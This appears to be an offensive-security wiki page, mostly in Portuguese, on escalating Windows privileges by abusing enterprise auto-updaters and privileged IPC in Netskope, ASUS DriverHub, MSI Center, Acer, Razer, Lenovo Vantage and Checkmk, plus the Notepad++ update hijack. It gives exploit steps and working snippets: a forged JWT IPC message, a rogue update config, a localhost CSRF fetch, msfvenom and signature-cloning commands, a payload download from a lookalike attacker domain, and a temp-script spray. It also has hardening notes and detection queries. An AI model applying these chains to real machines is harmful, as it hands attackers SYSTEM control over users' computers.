# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de elevação local de privilégios no Windows encontradas em agentes e updaters corporativos de endpoint que expõem uma superfície IPC de baixa fricção e um fluxo de update privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode coagir o enrollment para um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos semelhantes:
- Abuse o IPC localhost de um serviço privilegiado para forçar re-enrollment ou reconfiguration para um servidor do atacante.
- Implemente os endpoints de update do vendor, entregue uma Trusted Root CA maliciosa e aponte o updater para um package malicioso, “signed”.
- Evite weak signer checks (CN allow-lists), optional digest flags e lax MSI properties.
- Se o IPC for “encrypted”, derive a key/IV de machine identifiers legíveis por todos armazenados no registry.
- Se o serviço restringir callers por image path/process name, inject em um processo allow-listed ou inicie um suspenso e faça bootstrap da sua DLL via um minimal thread-context patch.

---
## 1) Forçando enrollment para um servidor do atacante via localhost IPC

Muitos agents incluem um processo de UI em user-mode que se comunica com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploit:
1) Crie um token JWT de enrollment cujos claims controlem o backend host (por exemplo, AddonUrl). Use alg=None para que nenhuma signature seja necessária.
2) Envie a mensagem IPC invocando o comando de provisioning com seu JWT e tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a atingir seu rogue server para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do caller for baseada em path/name, origine a request a partir de um allow-listed vendor binary (veja §4).

---
## 2) Hijacking o update channel para executar code como SYSTEM

Assim que o client falar com seu server, implemente os endpoints esperados e direcione-o para um attacker MSI. Sequência típica:

1) /v2/config/org/clientconfig → Retorne JSON config com um updater interval muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado PEM de CA. O serviço o instala no Trusted Root store da Local Machine.
3) /v2/checkupdate → Forneça metadados apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: o serviço pode apenas verificar se o Subject CN é “netSkope Inc” ou “Netskope, Inc.”. Sua rogue CA pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade benigna do MSI chamada CERT_DIGEST. Não há enforcement na instalação.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) desativa validação criptográfica extra.

Resultado: o serviço SYSTEM instala seu MSI a partir de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

Patch-bypass lesson: se um vendor responder fazendo allow-list de um pequeno conjunto de domains “trusted” em vez de autenticar criptograficamente a source da atualização, procure redirectors ou reverse proxies de propriedade do vendor que ainda permitam controlar o tráfego. No caso da Netskope, pesquisas públicas posteriores mostraram que um allow-list da era R129 ainda podia ser abusado via `rproxy.goskope.com`, que fazia proxy de conteúdo do Azure App Service controlado pelo atacante. Trate hostname allow-lists como um speed bump, não como uma trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing mostrou AES com key/IV derivados de valores de registry legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: se um agent de repente “encrypts” seu IPC, procure device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatas:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraia dados de roteamento com suporte do registro usados por servidores IPC baseados em plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraia primeiro os nomes dos endpoints, as chaves JSON e os IDs de comando do client em user-mode. Frontends Electron/.NET packed frequentemente vazam o esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Procure o predicado de confiança real, não apenas o caminho de código que eventualmente inicia o processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Padrões que valem priorizar:
- `CryptQueryObject`/análise de certificado sem `WinVerifyTrust` normalmente significa que “o certificado existe” foi tratado como “o certificado é confiável”, permitindo certificate cloning ou outros fake-signer tricks.
- Checks de substring/suffix em `Origin`, `Referer`, download URLs, nomes de processo ou signer CNs não são autenticação. `contains(".vendor.com")` geralmente é explorável com domains parecidos controlados pelo atacante.
- Se a GUI com low-privilege decide “o arquivo é trusted” e o broker SYSTEM apenas consome esse resultado, patching ou reimplementação da DLL/JS do lado do client muitas vezes contorna completamente a boundary (split validation estilo Razer).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois valida ou agenda ele a partir desse path, teste imediatamente janelas de replacement TOCTOU e sibling plugin modules que exponham wrappers alternativos `ExecuteTask()` com checks mais fracos.

Para targets com muito uso de named-pipe, PipeViewer é uma forma rápida de identificar DACLs fracas e pipes acessíveis remotamente antes de começar a reverter o protocol em profundidade.

Se o target autentica callers apenas por PID, image path ou process name, trate isso como um speed bump e não como uma boundary: injetar no client legítimo, ou fazer a connection a partir de um processo allow-listed, muitas vezes já basta para satisfazer os checks do server. Para named pipes especificamente, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) cobre o primitive com mais profundidade.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

Uma variação mais nova que vale caçar é o **signed-client RPC broker**: um processo desktop da Lenovo com low-privilege e assinado fala com um serviço SYSTEM, e o serviço roteia comandos JSON para um conjunto de add-ins descritos em XML sob `%ProgramData%`. Uma vez que code execution é obtido **dentro de qualquer signed client aceito**, todo contrato `runas="system"` vira parte da sua attack surface.

Primitives de alto valor observados na pesquisa do Lenovo Vantage:
- **Confiar no caller porque ele é assinado pelo vendor**: pesquisadores chegaram a um contexto autenticado copiando um EXE assinado pela Lenovo para um diretório gravável e satisfazendo um DLL side-load (`profapi.dll`) para que código arbitrário rodasse dentro de um client em que o service já confiava.
- **Descoberta de attack surface guiada por manifest**: add-ins são declarados em `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; vários contracts rodam como `SYSTEM`, então enumerar esses manifests muitas vezes revela os verbos privilegiados reais mais rápido do que reverter o broker em si.
- **Bugs por comando atrás do channel autenticado**: uma vez dentro do client trusted, a pesquisa pública encontrou path-traversal + race conditions em verbs de update/install, abuso de raw-SQL em bancos de dados de configurações privilegiadas e checks de registry path baseados em substring que permitiam writes fora do hive pretendido.

Recon útil em um target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Dica prática: sempre que um helper suite expõe um broker que primeiro autentica o **caller process** e só depois despacha dezenas de comandos de plugin/add-in, não pare após burlar a checagem de confiança da porta de entrada. Faça dump da manifest/contract table e teste cada verbo de alto privilégio de forma independente; o canal autenticado normalmente esconde vários bugs de segunda fase.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub vem com um serviço HTTP em modo de usuário (ADU.exe) em 127.0.0.1:53000 que espera chamadas do browser vindas de https://driverhub.asus.com. O filtro de origin simplesmente aplica `string_contains(".asus.com")` no header Origin e nas download URLs expostas por `/asus/v1.0/*`. Qualquer host controlado pelo atacante, como `https://driverhub.asus.com.attacker.tld`, portanto passa na checagem e pode emitir requests que alteram o estado a partir de JavaScript. Veja [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que incorpore `.asus.com` e hospede ali uma página web maliciosa.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o body JSON esperado pelo handler – o JS frontend empacotado mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo a CLI do PowerShell mostrada abaixo é bem-sucedida quando o cabeçalho Origin é falsificado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita do navegador ao site do atacante, portanto, se torna um local CSRF de 1 clique (ou 0-click via `onload`) que aciona um helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` baixa executables arbitrários definidos no corpo JSON e os armazena em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, ADU.exe apenas verifica se o PE contém uma assinatura e se a string Subject corresponde a ASUS antes de executá-lo – sem `WinVerifyTrust`, sem validação de chain.

Para weaponize o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o signer da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio parecidíssimo com `.asus.com` e dispare `UpdateApp` via o browser CSRF acima.

Como tanto os filtros de Origin quanto de URL são baseados em substring e a verificação do signer só compara strings, DriverHub baixa e executa o binary do atacante sob o contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP onde cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executable fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura via `CS_CommonAPI.EX_CA::Verify` (o subject do certificado deve ser igual a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma scheduled task que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica travado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binary legítimo assinado pela MSI (garante que a checagem de assinatura passe e que a task seja enfileirada).
- Corrigi-lo com mensagens repetidas do Frame B apontando para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a verificação terminar.

Quando o scheduler dispara, ele executa o payload sobrescrito sob SYSTEM apesar de ter validado o arquivo original. A exploração confiável usa duas goroutines/threads que spam `CMD_AutoUpdateSDK` até vencer a janela de TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Todo plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes roteiem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` com **nenhuma validação de assinatura** – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução SYSTEM de forma determinística.
- Sniffing do loopback com Wireshark ou instrumentação dos binaries .NET no dnSpy revela rapidamente o mapeamento Component ↔ command; clientes customizados em Go/ Python podem então reproduzir os frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e seu ACL discricionário permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um caminho de arquivo invoca a rotina de spawn de processo do serviço.
- A client library serializa um magic terminator byte (113) junto com os args. Instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) cai no branch genérico que mantém o token completo de SYSTEM e define um integrity SID alto (`S-1-16-12288`). O binary gerado então roda como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag de installer exposta (`Setup.exe -nocheck`) para subir o ACC até em VMs de laboratório e testar o pipe sem hardware do vendor.

Esses bugs de IPC mostram por que serviços localhost precisam impor autenticação mútua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que todo helper de “run arbitrary binary” de cada módulo deve compartilhar as mesmas verificações de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

O Razer Synapse 4 adicionou outro padrão útil a essa família: um user de baixo privilégio pode pedir a um COM helper que inicie um processo via `RzUtility.Elevator`, enquanto a decisão de confiança fica delegada a uma DLL em user-mode (`simple_service.dll`) em vez de ser aplicada de forma robusta dentro da fronteira privilegiada.

Caminho de exploração observado:
- Instanciar o objeto COM `RzUtility.Elevator`.
- Chamar `LaunchProcessNoWait(<path>, "", 1)` para solicitar uma execução elevada.
- No PoC público, o gate de assinatura PE dentro de `simple_service.dll` é removido antes de emitir a request, permitindo que um executable arbitrário escolhido pelo atacante seja iniciado.

Chamada mínima em PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Tomada geral: ao reverter suítes “helper”, não pare em TCP localhost ou named pipes. Verifique classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility`, depois valide se o serviço privilegiado realmente verifica o binário de destino em si ou apenas confia em um resultado calculado por uma DLL client em user-mode que pode ser patchable. Esse padrão vai além da Razer: qualquer design dividido em que o broker de alta privilege consome uma decisão allow/deny da parte de baixa privilege é um candidato a surface de privesc.


---
## Execução previsível de script temporário durante repair de MSI (Checkmk Agent / CVE-2024-0670)

Alguns agentes Windows ainda implementam ações privilegiadas escrevendo um `.cmd` temporário em `C:\Windows\Temp` e executando-o como `SYSTEM`. Se o nome do arquivo for previsível e o serviço não recriar arquivos existentes de forma segura, um usuário low-privileged pode pré-criar o futuro arquivo temp como **read-only** e fazer com que o processo privilegiado execute conteúdo controlado pelo attacker em vez do próprio script.

Observado em builds vulneráveis do Checkmk Agent:
- padrão de temp: `cmk_all_<PID>_1.cmd`
- branches afetadas: `2.0.0`, `2.1.0`, `2.2.0`
- gatilho: repair **MSI** do pacote do agent em cache

Fluxo prático:
1. Estime um intervalo realista de PID a partir dos PIDs atuais dos processos ou do PID do agent em execução.
2. Escreva um payload curto `.cmd` em **ASCII** (`Set-Content -Encoding Ascii` ou redirecionamento do `cmd.exe`; evite saída UTF-16 do PowerShell para arquivos batch).
3. Faça spray de `C:\Windows\Temp\cmk_all_<PID>_1.cmd` no intervalo candidato e marque cada arquivo como read-only.
4. Dispare um repair do MSI em cache para que o serviço privilegiado tente regenerar e então execute o script temp.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Se o produto vulnerável estiver instalado com Windows Installer, mapeie o MSI em cache com nome aleatório em `C:\Windows\Installer` de volta ao nome do produto antes de acionar o repair:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` is useful when `msiexec /fa` fails from a non-interactive WinRM shell and you need to understand whether an existing desktop/disconnected session can trigger the repair correctly.
- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não é do Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Esses padrões se generalizam para qualquer updater que aceita manifests não assinados ou falha em fixar os signers do installer—network hijack + malicious installer + BYO-signed sideloading resulta em remote code execution sob o pretexto de updates “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
